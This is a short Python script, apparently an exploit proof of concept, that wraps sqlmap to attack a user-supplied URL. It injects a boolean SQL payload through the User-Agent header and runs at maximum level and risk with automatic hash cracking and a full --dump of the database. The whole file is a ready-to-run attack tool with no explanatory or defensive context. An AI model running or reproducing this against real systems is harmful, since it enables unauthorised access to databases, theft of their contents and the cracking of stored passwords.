#!/usr/bin/python
import os
import sys

def run_sqlmap():
    try:
        print("Your sqlmap env path, FOR EXAMPLE: (D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py)...\n")
        env = "D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py"

        print("Your URL parameter for testing....\n")
        url = input("Enter URL: ").strip()

        # Basic input validation
        if not url:
            print("[-] No URL provided. Exiting.")
            return

        cmd = (
            f'python "{env}" -u "{url}" '
            '--tamper=space2comment '
            '--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3697127327\' or 9527=9527--" '
            '--dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 '
            '--batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
        )

        os.system(cmd)

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    try:
        run_sqlmap()
        user_input = input("\nDo you want to exit? (yes/no): ").strip().lower()
        if user_input == 'yes':
            print("Goodbye!")
            sys.exit(0)
        else:
            print("Continuing the program...")
            # Extend with more logic here if needed
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting cleanly.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        pass  # Prevents traceback from showing
